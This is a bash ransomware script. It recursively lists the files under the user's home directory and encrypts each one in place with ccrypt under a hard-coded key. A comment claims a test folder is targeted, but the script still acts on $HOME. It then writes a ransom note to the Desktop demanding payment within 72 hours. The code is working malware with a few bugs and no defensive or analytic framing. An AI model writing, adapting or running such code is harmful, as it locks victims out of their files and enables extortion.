#!/bin/bash

secret_key='secret_key' # change this
pwd=`pwd`

root_dir='$HOME/Desktop/Testing' # testing only
# uncomment below line if running in an isolated environment 
# for a close to realworld scenario.
# root_dir='$HOME'

cd "$HOME"

list=$(ls -l -R | grep '^-' | awk '{print $9}')
number=$(ls -l -R | grep '^-' | awk '{print $9}' | wc -l)

for i in `seq 1 $number`; do
	filename=$(echo $list | awk -v x=$i '{print $x}')
	output=`find $PWD -name $filename`
	dir_name=${out%/*}
	
	echo "[+] Encrypting\t$filename"
	ccrypt -f -q -e $filename -K $secret_key
done;

cd "$HOME/Desktop"

message="""Hello!
I'd ask how your days going, though it's just gotten worse.

Congratulations! As all of your files, photos, videos, documents, databases, and anything possibly important has been ecrypted with the strongest encryptions locked down with a personalized key unique to your computer.

A private decryption key is required to be able to decrypt your data, which will only be provided after you have followed the following - 
You have 72 hours to submit the payment or all of your files will be encrypted permenently and never accessible by anyone."""

echo "$message" > README.txt
cd $pwd

